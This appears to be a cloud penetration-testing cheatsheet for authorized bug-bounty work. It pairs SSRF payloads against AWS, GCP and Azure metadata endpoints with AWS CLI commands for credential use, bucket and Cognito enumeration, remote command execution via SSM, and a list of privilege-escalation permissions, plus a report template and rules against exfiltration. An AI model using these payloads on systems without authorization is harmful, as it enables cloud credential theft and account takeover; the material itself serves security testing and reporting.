# Cheatsheet — Hacking the Cloud

Quick-lookup card. Mechanics in `chapters/`; mindset in `SKILL.md`; terms in `glossary.md`.

## The kill chain to test

`SSRF/XXE/LFI → metadata (169.254.169.254 / metadata.google.internal) → IAM creds → get-caller-identity → permission probe → storage/policy evidence`

## Quick tests

| Finding | First probe | Confirms |
|---|---|---|
| SSRF→AWS IMDS | `?url=http://169.254.169.254/latest/meta-data/` | 200 body; then `/iam/security-credentials/` role name |
| IMDSv2 check | SSRF `PUT /latest/api/token` (TTL header) | token returned → v1 likely enforced… v2 blocked = report anyway |
| No-role check | `…/meta-data/iam/` | 404 = no role; empty 200 = revoked |
| GCP metadata | `?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` w/ `Metadata-Flavor: Google` | OAuth token JSON |
| Azure MSI | `?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01` w/ `Metadata: true` | instance JSON; `$IDENTITY_ENDPOINT` on App Service |
| Leaked AWS key | `aws sts get-caller-identity` (once) | ARN + account ID → in scope? report |
| Account ID from key | `aws sts get-access-key-info --access-key-id AKIA…` | 12-digit ID (logs to YOUR account) |
| Public bucket | `aws s3 ls s3://NAME --no-sign-request` | listing = read exposure |
| Bucket write | `echo poc \| aws s3 cp - s3://NAME/poc.txt` then `aws s3 rm` | write = supply-chain risk |
| Takeover | CNAME→`NoSuchBucket`/CloudFront `NotFound` | create bucket name → serves victim domain |
| Cognito signup | `aws cognito-idp sign-up --client-id …` | account created / UsernameExistsException = enum |
| Identity pool creds | `get-id` + `get-credentials-for-identity` | ASIA creds → role perms decide impact |
| Public snapshots | `aws ec2 describe-snapshots --restorable-by-user-ids all --owner-ids ACCT` | list = exposure |
| Public AMIs | `aws ec2 describe-images --owners ACCT --include-deprecated` | launch+scan in own account |
| Role/user enum | name as Principal in YOUR trust policy | save succeeds = exists |
| Root email | console sign-in, "Root user" radio | password prompt vs "does not exist" |
| Azure blob list | `/<container>?restype=container&comp=list` | anonymous XML listing |

## Metadata endpoints

```
AWS v1   http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
AWS v6   http://[fd00:ec2::254]/latest/meta-data/
AWS v2   PUT /latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds) → X-aws-ec2-metadata-token
user-data http://169.254.169.254/latest/user-data/
identity http://169.254.169.254/latest/dynamic/instance-identity/document
Lambda   file:///proc/self/environ | http://$AWS_LAMBDA_RUNTIME_API/2018-06-01/runtime/invocation/next
GCP      http://metadata.google.internal/computeMetadata/v1/?recursive=true -H "Metadata-Flavor: Google"
Azure VM http://169.254.169.254/metadata/instance?api-version=… -H "Metadata: true"
Azure app curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H "secret:$IDENTITY_HEADER"
CloudShell PUT localhost:1338/latest/api/token → GET localhost:1338/latest/meta-data/container/security-credentials
```

## Commands

```bash
aws sts get-caller-identity                              # whoami (logged)
aws sqs list-queues                                      # quiet whoami via AccessDenied ARN
aws cognito-idp sign-up --client-id X --username u --password 'P@ss123!' --user-attributes Name=email,Value=e@x.tld
aws cognito-identity get-id --identity-pool-id us-… --account-id …
aws cognito-identity get-credentials-for-identity --identity-id … --logins p:t
aws-vault login -s                                       # creds → console URL
aws ssm send-command --instance-ids i-x --document-name AWS-RunShellScript --parameters commands="id"
aws ssm list-command-invocations --command-id ID --details
aws ec2 describe-instance-attribute --instance-id i-x --attribute userData
aws backup list-protected-resources                      # what they care about
python3 -m pip install s3-account-search && s3-account-search arn:aws:iam::YOU:role/r BUCKET
./enumerate-iam.py --access-key … --secret-key … --session-token …   # noisy perms map
aws sts get-federation-token --name x --duration-seconds 129600
```

## Privesc smell test (policy evidence to screenshot)

`iam:Attach*/Put*Policy`, `CreatePolicyVersion`, `CreateAccessKey` on others, `UpdateAssumeRolePolicy`, `PassRole`+(`ec2:RunInstances`|`lambda:CreateFunction`|`cloudformation:CreateStack`|ECS/Glue/CodeBuild), `lambda:UpdateFunctionCode`, `ec2:ModifyInstanceAttribute`, `route53:ChangeResourceRecordSets`, wildcard/`NotPrincipal` in resource policies, OIDC trust without `sub`, GCP `serviceAccountKeys.create`/`implicitDelegation`/`getAccessToken`/`iam.roles.update`/`orgpolicy.policy.set`, Azure `runCommands/action`.

## Report skeleton

`[chain] via [entry] on [asset] → [confirmed hop] → [next-hop capability]`. Include: entry vuln, metadata version/reachability, one redacted cred/ARN proof, policy text evidencing permissions, CloudTrail events your PoC generated, remediation (IMDSv2 enforce, least-privilege role, public-access-block, OIDC conditions, key rotation).

## Hard rules

Validate once, report fast (ASIA dies). Own-account primitives only for enum. Marker-file writes only. Never read personal data, never persist, never exfiltrate — describe, don't demonstrate.
